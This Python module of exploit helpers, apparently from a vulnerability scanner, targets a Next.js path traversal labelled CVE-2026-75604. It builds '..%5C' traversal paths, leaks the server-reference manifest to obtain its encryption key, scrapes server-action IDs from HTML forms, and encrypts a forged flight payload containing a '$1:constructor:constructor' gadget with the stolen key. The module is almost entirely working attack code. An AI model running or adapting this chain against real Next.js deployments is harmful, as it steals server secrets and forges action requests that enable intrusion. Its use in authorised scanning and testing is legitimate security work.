#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-75604 helpers (Windows incremental-cache path traversal)."""

from __future__ import annotations

import base64
import json
import re
import secrets
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin

from lib.scanner.http.nextjs_probe import extract_nextjs_version, is_nextjs

_BUILD_ID_RE = re.compile(r'"b"\s*:\s*"([^"]+)"')
_SCRIPT_PUSH = re.compile(r"__next_f\.push\((.+)\)")


def origin_from_base(base_url: str) -> str:
    return (base_url or "").rstrip("/")


def normalize_path(prefix: str, *parts: str) -> str:
    bits = [str(prefix or "/").rstrip("/")]
    for part in parts:
        p = str(part or "").strip("/")
        if p:
            bits.append(p)
    path = "/".join(bits)
    return path if path.startswith("/") else f"/{path}"


def make_traversal(*parts: str, sequence: str = "..%5C") -> str:
    path = normalize_path(*parts)
    route_dirs = re.sub(r"^/_next/data/[^/]+", "", path).split("/")
    route_dirs = [x for x in route_dirs if x][1:-1] if len(route_dirs) > 2 else []
    depth = max(len(route_dirs) + 1, 1)
    return re.sub(r"/([^/]+)$", f"/{sequence * depth}\\1", path)


def parse_build_id(html: str) -> str:
    text = html or ""
    for match in _SCRIPT_PUSH.findall(text):
        try:
            arr = json.loads(match)
        except json.JSONDecodeError:
            continue
        if len(arr) < 2:
            continue
        chunk = re.sub(r"^\d+:", "", str(arr[1]))
        try:
            state = json.loads(chunk)
        except json.JSONDecodeError:
            continue
        if isinstance(state, dict) and state.get("b"):
            return str(state["b"])
    match = _BUILD_ID_RE.search(text)
    return match.group(1) if match else ""


def leak_manifest(
    http_get,
    base_path: str,
    build_id: str,
    app_router: str,
    pages_router: str,
    origin: str,
) -> Optional[dict]:
    http_get(
        make_traversal(base_path, app_router, "server-reference-manifest"),
        headers={"Origin": origin},
    )
    response = http_get(
        make_traversal(base_path, f"/_next/data/{build_id}", pages_router, "server-reference-manifest.json"),
        headers={"Origin": origin},
    )
    if not response or int(getattr(response, "status_code", 0) or 0) != 200:
        return None
    try:
        doc = json.loads(getattr(response, "text", "") or "{}")
    except json.JSONDecodeError:
        return None
    if isinstance(doc, dict) and (doc.get("encryptionKey") or doc.get("node")):
        return doc
    return None


def extract_actions_from_html(html: str) -> List[dict]:
    actions: List[dict] = []
    forms = re.split(r"</form>", html or "", flags=re.I)
    for chunk in forms:
        if "<form" not in chunk.lower():
            continue
        form = chunk + "</form>"
        valid_fields: Dict[str, str] = {}
        for name, default in re.findall(
            r'<(?:input|textarea)[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
            form,
            flags=re.I,
        ):
            if not name or name.startswith("$ACTION_"):
                continue
            if name not in valid_fields:
                valid_fields[name] = default or secrets.token_hex(4)
        if not valid_fields:
            continue
        target_field = next(iter(valid_fields.keys()))
        for ref_key, _ in re.findall(r'name=["\'](\$ACTION_REF_([^"\']+))["\']', form):
            desc = re.search(rf'name=["\']\\$ACTION_{ref_key.split("_")[-1]}:0["\']\\s+value=["\']([^"\']+)', form)
            if not desc:
                desc = re.search(rf"name=['\"]\\$ACTION_[^'\"]+:0['\"][^>]*value=['\"]([^'\"]+)", form)
            if not desc:
                continue
            try:
                action_id = json.loads(desc.group(1)).get("id")
            except (json.JSONDecodeError, AttributeError):
                continue
            if action_id:
                actions.append(
                    {
                        "reference": ref_key.split("$ACTION_REF_")[-1],
                        "id": action_id,
                        "field": target_field,
                        "valid_fields": dict(valid_fields),
                    }
                )
    return actions


def encrypt_bound_args(action_id: str, encryption_key: str) -> str:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    flight = "1:{}\n0:[\"$1:constructor:constructor\"]\n"
    plaintext = (action_id or "") + flight
    key = base64.b64decode(encryption_key)
    if len(key) not in (16, 24, 32):
        raise ValueError(f"Unexpected encryption key length: {len(key)}")
    iv = secrets.token_bytes(16)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(iv, plaintext.encode(), b"")
    return base64.b64encode(iv + ciphertext).decode()


def looks_like_nextjs(response: Any) -> bool:
    if not response:
        return False
    headers = getattr(response, "headers", {}) or {}
    if "next.js" in str(headers.get("X-Powered-By", "")).lower():
        return True
    body = getattr(response, "text", "") or ""
    return any(token in body for token in ("__NEXT_DATA__", "/_next/static/", "__next_f.push"))